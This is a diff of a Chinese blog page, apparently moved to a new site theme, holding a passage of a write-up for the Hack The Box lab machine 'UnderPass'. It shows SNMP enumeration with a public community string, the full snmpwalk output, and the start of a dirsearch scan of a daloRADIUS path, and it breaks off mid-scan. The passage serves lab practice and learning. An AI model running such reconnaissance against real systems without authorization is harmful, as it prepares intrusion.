@@ -1,234 +1,386 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTB-UnderPass | Yiyi</title><meta name="author" content="yiyi"><meta name="copyright" content="yiyi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="fscan只扫出22 80 110端口 学到一个新的信息搜集的新招 snmpwalk 命令从目标主机 underpass.htb 获取的管理信息库 (MIB) 数据 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950┌──(root㉿kali)-[~]└─# snmp">
-<meta property="og:type" content="article">
-<meta property="og:title" content="HTB-UnderPass">
-<meta property="og:url" content="https://xyaxxya.github.io/posts/f5701a7f.html">
-<meta property="og:site_name" content="Yiyi">
-<meta property="og:description" content="fscan只扫出22 80 110端口 学到一个新的信息搜集的新招 snmpwalk 命令从目标主机 underpass.htb 获取的管理信息库 (MIB) 数据 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950┌──(root㉿kali)-[~]└─# snmp">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://www.dmoe.cc/random.php?4350">
-<meta property="article:published_time" content="2025-03-23T05:04:33.000Z">
-<meta property="article:modified_time" content="2025-03-23T08:54:56.438Z">
-<meta property="article:author" content="yiyi">
-<meta property="article:tag" content="渗透">
-<meta property="article:tag" content="HTB">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.dmoe.cc/random.php?4350"><link rel="shortcut icon" href="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"><link rel="canonical" href="https://xyaxxya.github.io/posts/f5701a7f.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="JKAzMndNFupeAvLybmTDZQvXJ-qzwexiresLFX-aPSw"/><meta name="msvalidate.01" content="46A43356A247D4026C1F053B84E2275F"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
-  root: '/',
-  algolia: undefined,
-  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
-  translate: undefined,
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '天',
-  dateSuffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
-  },
-  copyright: undefined,
-  lightbox: 'fancybox',
-  Snackbar: undefined,
-  infinitegrid: {
-    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
-    buttonText: '加载更多'
-  },
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isAnchor: true,
-  percent: {
-    toc: true,
-    rightside: false,
-  },
-  autoDarkmode: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'HTB-UnderPass',
-  isPost: true,
-  isHome: false,
-  isHighlightShrink: false,
-  isToc: false,
-  postUpdate: '2025-03-23 16:54:56'
-}</script><script>(win=>{
-      win.saveToLocal = {
-        set: (key, value, ttl) => {
-          if (ttl === 0) return
-          const now = Date.now()
-          const expiry = now + ttl * 86400000
-          const item = {
-            value,
-            expiry
-          }
-          localStorage.setItem(key, JSON.stringify(item))
-        },
-      
-        get: key => {
-          const itemStr = localStorage.getItem(key)
-      
-          if (!itemStr) {
-            return undefined
-          }
-          const item = JSON.parse(itemStr)
-          const now = Date.now()
-      
-          if (now > item.expiry) {
-            localStorage.removeItem(key)
-            return undefined
-          }
-          return item.value
-        }
-      }
+<!doctype html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <meta name="description" content="fscan只扫出22 80 110端口 学到一个新的信息搜集的新招 snmpwalk 命令从目标主机 underpass.htb 获取的管理信息库 MIB 数据 得知该服务器运行了 daloRADIUS 查询得知目录结构一般为/daloradius/... 进一步目录扫描 但…">
+    <meta name="theme-color" content="#0d0e12">
+    <meta name="color-scheme" content="light dark">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="HTB-UnderPass · Yiyi">
+    <meta property="og:description" content="fscan只扫出22 80 110端口 学到一个新的信息搜集的新招 snmpwalk 命令从目标主机 underpass.htb 获取的管理信息库 MIB 数据 得知该服务器运行了 daloRADIUS 查询得知目录结构一般为/daloradius/... 进一步目录扫描 但…">
+    <meta property="og:url" content="https://xyaxxya.github.io/posts/f5701a7f.html">
+    <meta property="og:site_name" content="Yiyi">
+    <meta name="twitter:card" content="summary_large_image">
+    <link rel="canonical" href="https://xyaxxya.github.io/posts/f5701a7f.html">
+    <link rel="alternate" type="application/rss+xml" title="Yiyi RSS" href="/rss.xml">
+    <link rel="icon" href="/assets/avatar.svg" type="image/svg+xml">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/assets/styles.css">
+    <script>try{document.documentElement.dataset.theme=localStorage.getItem("yiyi-theme")||"auto"}catch(e){}</script>
+    <meta property="article:published_time" content="2025-03-23T05:04:33.000Z"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB-UnderPass","datePublished":"2025-03-23T05:04:33.000Z","author":{"@type":"Person","name":"yiyi"},"publisher":{"@type":"Person","name":"yiyi"},"mainEntityOfPage":"https://xyaxxya.github.io/posts/f5701a7f.html","description":"fscan只扫出22 80 110端口 学到一个新的信息搜集的新招 snmpwalk 命令从目标主机 underpass.htb 获取的管理信息库 MIB 数据 得知该服务器运行了 daloRADIUS 查询得知目录结构一般为/daloradius/... 进一步目录扫描 但…"}</script>
+    <title>HTB-UnderPass · Yiyi</title></head>
+  <body class="inner-page post-body">
+    <a class="skip-link" href="#main-content">跳到正文</a>
     
-      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
-        const script = document.createElement('script')
-        script.src = url
-        script.async = true
-        script.onerror = reject
-        script.onload = script.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          script.onload = script.onreadystatechange = null
-          resolve()
-        }
-
-        Object.keys(attr).forEach(key => {
-          script.setAttribute(key, attr[key])
-        })
-
-        document.head.appendChild(script)
-      })
+    <header class="site-header" data-site-header>
+      <div class="site-header-inner">
+        <a class="site-brand" href="/" aria-label="Yiyi 首页">Yiyi</a>
+        <nav class="site-nav" aria-label="主导航"><a class="site-nav-link" href="/#articles">文章</a><a class="site-nav-link" href="/categories/">专题</a><a class="site-nav-link" href="/tags/">标签</a><a class="site-nav-link" href="/archives/">归档</a><a class="site-nav-link" href="/about/">关于</a></nav>
+        <div class="site-actions">
+          
+  <button class="icon-button" type="button" aria-label="搜索" data-tooltip="搜索" data-open-search>
+    <svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m21 21-4.34-4.34"></path><circle cx="11" cy="11" r="8"></circle></svg>
+  </button>
+          <button class="icon-button theme-toggle" type="button" data-theme-toggle aria-label="切换主题" data-tooltip="切换主题">
+            <svg class="icon theme-icon-light" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="4"></circle><path d="M12 2v2"></path><path d="M12 20v2"></path><path d="m4.93 4.93 1.41 1.41"></path><path d="m17.66 17.66 1.41 1.41"></path><path d="M2 12h2"></path><path d="M20 12h2"></path><path d="m6.34 17.66-1.41 1.41"></path><path d="m19.07 4.93-1.41 1.41"></path></svg>
+            <svg class="icon theme-icon-dark" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401"></path></svg>
+          </button>
+          
+  <button class="icon-button mobile-menu-trigger" type="button" aria-label="打开菜单" data-tooltip="打开菜单" data-menu-toggle aria-expanded="false">
+    <svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M4 5h16"></path><path d="M4 12h16"></path><path d="M4 19h16"></path></svg>
+  </button>
+        </div>
+      </div>
+    </header>
     
-      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
-        const link = document.createElement('link')
-        link.rel = 'stylesheet'
-        link.href = url
-        if (id) link.id = id
-        link.onerror = reject
-        link.onload = link.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          link.onload = link.onreadystatechange = null
-          resolve()
-        }
-        document.head.appendChild(link)
-      })
-    
-      win.activateDarkMode = () => {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      win.activateLightMode = () => {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
-      const t = saveToLocal.get('theme')
-    
-        if (t === 'dark') activateDarkMode()
-        else if (t === 'light') activateLightMode()
-      
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
-    
-      const detectApple = () => {
-        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
-          document.documentElement.classList.add('apple')
-        }
-      }
-      detectApple()
-    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">69</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.dmoe.cc/random.php?4350')"><nav id="nav"><span id="blog-info"><a href="/" title="Yiyi"><img class="site-icon" src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"/><span class="site-name">Yiyi</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HTB-UnderPass</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-23T05:04:33.000Z" title="发表于 2025-03-23 13:04:33">2025-03-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-23T08:54:56.438Z" title="更新于 2025-03-23 16:54:56">2025-03-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>11分钟</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/posts/f5701a7f.html" data-flag-title="HTB-UnderPass"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/f5701a7f.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/f5701a7f.html" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>fscan只扫出22 80 110端口</p>
+    <div class="reading-progress" aria-hidden="true"><span data-reading-progress></span></div>
+    <main id="main-content" class="post-page">
+      <header class="post-hero section-shell">
+        <a class="post-topic" href="/categories/?topic=%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98">靶场实战</a>
+        <h1>HTB-UnderPass</h1>
+        <p>fscan只扫出22 80 110端口 学到一个新的信息搜集的新招 snmpwalk 命令从目标主机 underpass.htb 获取的管理信息库 MIB 数据 得知该服务器运行了 daloRADIUS 查询得知目录结构一般为/daloradius/... 进一步目录扫描 但…</p>
+        <div class="post-meta">
+  <span>2025/03/23</span>
+  <span>1 分钟</span>
+  </div>
+        <div class="post-tags"><a href="/tags/?tag=%E6%B8%97%E9%80%8F">#渗透</a><a href="/tags/?tag=HTB">#HTB</a></div>
+      </header>
+      <div class="post-layout section-shell">
+        <article class="article-content" data-article-content><p>fscan只扫出22 80 110端口</p>
 <p>学到一个新的信息搜集的新招</p>
 <p><code>snmpwalk</code> 命令从目标主机 <code>underpass.htb</code> 获取的管理信息库 (MIB) 数据</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># snmpwalk -v1 -c public underpass.htb</span></span><br><span class="line">Created directory: /var/lib/snmp/cert_indexes</span><br><span class="line">iso.3.6.1.2.1.1.1.0 = STRING: <span class="string">&quot;Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64&quot;</span></span><br><span class="line">iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10</span><br><span class="line">iso.3.6.1.2.1.1.3.0 = Timeticks: (11947193) 1 day, 9:11:11.93</span><br><span class="line">iso.3.6.1.2.1.1.4.0 = STRING: <span class="string">&quot;steve@underpass.htb&quot;</span></span><br><span class="line">iso.3.6.1.2.1.1.5.0 = STRING: <span class="string">&quot;UnDerPass.htb is the only daloradius server in the basin!&quot;</span></span><br><span class="line">iso.3.6.1.2.1.1.6.0 = STRING: <span class="string">&quot;Nevada, U.S.A. but not Vegas&quot;</span></span><br><span class="line">iso.3.6.1.2.1.1.7.0 = INTEGER: 72</span><br><span class="line">iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.1 = STRING: <span class="string">&quot;The SNMP Management Architecture MIB.&quot;</span></span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.2 = STRING: <span class="string">&quot;The MIB for Message Processing and Dispatching.&quot;</span></span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.3 = STRING: <span class="string">&quot;The management information definitions for the SNMP User-based Security Model.&quot;</span></span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.4 = STRING: <span class="string">&quot;The MIB module for SNMPv2 entities&quot;</span></span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.5 = STRING: <span class="string">&quot;View-based Access Control Model for SNMP.&quot;</span></span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.6 = STRING: <span class="string">&quot;The MIB module for managing TCP implementations&quot;</span></span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.7 = STRING: <span class="string">&quot;The MIB module for managing UDP implementations&quot;</span></span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.8 = STRING: <span class="string">&quot;The MIB module for managing IP and ICMP implementations&quot;</span></span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.9 = STRING: <span class="string">&quot;The MIB modules for managing SNMP Notification, plus filtering.&quot;</span></span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.10 = STRING: <span class="string">&quot;The MIB module for logging SNMP Notifications.&quot;</span></span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (1) 0:00:00.01</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (1) 0:00:00.01</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (1) 0:00:00.01</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (1) 0:00:00.01</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (1) 0:00:00.01</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (1) 0:00:00.01</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (1) 0:00:00.01</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (1) 0:00:00.01</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (1) 0:00:00.01</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (1) 0:00:00.01</span><br><span class="line">iso.3.6.1.2.1.25.1.1.0 = Timeticks: (11948492) 1 day, 9:11:24.92</span><br><span class="line">iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 03 17 04 35 2C 00 2B 00 00 </span><br><span class="line">iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216</span><br><span class="line">iso.3.6.1.2.1.25.1.4.0 = STRING: <span class="string">&quot;BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0</span><br><span class="line">iso.3.6.1.2.1.25.1.6.0 = Gauge32: 217</span><br><span class="line">iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0</span><br><span class="line">End of MIB</span><br></pre></td></tr></table></figure>
-
-<p>得知该服务器运行了<strong>daloRADIUS</strong></p>
-<p>查询得知目录结构一般为&#x2F;daloradius&#x2F;…</p>
+<figure class="code-block"><figcaption><span>bash</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-bash">┌──(root㉿kali)-[~]
+└─# snmpwalk -v1 -c public underpass.htb
+Created directory: /var/lib/snmp/cert_indexes
+iso.3.6.1.2.1.1.1.0 = STRING: <span class="hljs-string">&quot;Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64&quot;</span>
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (11947193) 1 day, 9:11:11.93
+iso.3.6.1.2.1.1.4.0 = STRING: <span class="hljs-string">&quot;steve@underpass.htb&quot;</span>
+iso.3.6.1.2.1.1.5.0 = STRING: <span class="hljs-string">&quot;UnDerPass.htb is the only daloradius server in the basin!&quot;</span>
+iso.3.6.1.2.1.1.6.0 = STRING: <span class="hljs-string">&quot;Nevada, U.S.A. but not Vegas&quot;</span>
+iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
+iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
+iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
+iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
+iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
+iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
+iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
+iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
+iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
+iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
+iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
+iso.3.6.1.2.1.1.9.1.3.1 = STRING: <span class="hljs-string">&quot;The SNMP Management Architecture MIB.&quot;</span>
+iso.3.6.1.2.1.1.9.1.3.2 = STRING: <span class="hljs-string">&quot;The MIB for Message Processing and Dispatching.&quot;</span>
+iso.3.6.1.2.1.1.9.1.3.3 = STRING: <span class="hljs-string">&quot;The management information definitions for the SNMP User-based Security Model.&quot;</span>
+iso.3.6.1.2.1.1.9.1.3.4 = STRING: <span class="hljs-string">&quot;The MIB module for SNMPv2 entities&quot;</span>
+iso.3.6.1.2.1.1.9.1.3.5 = STRING: <span class="hljs-string">&quot;View-based Access Control Model for SNMP.&quot;</span>
+iso.3.6.1.2.1.1.9.1.3.6 = STRING: <span class="hljs-string">&quot;The MIB module for managing TCP implementations&quot;</span>
+iso.3.6.1.2.1.1.9.1.3.7 = STRING: <span class="hljs-string">&quot;The MIB module for managing UDP implementations&quot;</span>
+iso.3.6.1.2.1.1.9.1.3.8 = STRING: <span class="hljs-string">&quot;The MIB module for managing IP and ICMP implementations&quot;</span>
+iso.3.6.1.2.1.1.9.1.3.9 = STRING: <span class="hljs-string">&quot;The MIB modules for managing SNMP Notification, plus filtering.&quot;</span>
+iso.3.6.1.2.1.1.9.1.3.10 = STRING: <span class="hljs-string">&quot;The MIB module for logging SNMP Notifications.&quot;</span>
+iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (1) 0:00:00.01
+iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (1) 0:00:00.01
+iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (1) 0:00:00.01
+iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (1) 0:00:00.01
+iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (1) 0:00:00.01
+iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (1) 0:00:00.01
+iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (1) 0:00:00.01
+iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (1) 0:00:00.01
+iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (1) 0:00:00.01
+iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (1) 0:00:00.01
+iso.3.6.1.2.1.25.1.1.0 = Timeticks: (11948492) 1 day, 9:11:24.92
+iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 03 17 04 35 2C 00 2B 00 00 
+iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
+iso.3.6.1.2.1.25.1.4.0 = STRING: <span class="hljs-string">&quot;BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
+&quot;</span>
+iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
+iso.3.6.1.2.1.25.1.6.0 = Gauge32: 217
+iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
+End of MIB</code></pre></figure><p>得知该服务器运行了<strong>daloRADIUS</strong></p>
+<p>查询得知目录结构一般为/daloradius/...</p>
 <p>进一步目录扫描</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">E:\小工具\<span class="title">ONE</span>-<span class="title">FOX</span>集成工具箱<span class="title">_V8</span>公开版<span class="title">_by</span>狐狸\<span class="title">gui_scan</span>\<span class="title">dirsearch</span>&gt;<span class="title">python</span> <span class="title">dirsearch.py</span> -<span class="title">u</span> <span class="title">http</span>://<span class="title">underpass.htb</span>/<span class="title">daloradius</span>/</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">_</span>|. <span class="title">_</span> <span class="title">_</span>  <span class="title">_</span>  <span class="title">_</span>  <span class="title">_</span> <span class="title">_</span>|<span class="title">_</span>    <span class="title">v0</span>.4.3 <span class="title">by</span> 鹏组安全</span></span><br><span class="line"><span class="function"> (<span class="title">_</span>||| <span class="title">_</span>) (/<span class="title">_</span>(<span class="title">_</span>|| (<span class="title">_</span>| )</span></span><br><span class="line"><span class="function"></span></span><br><span 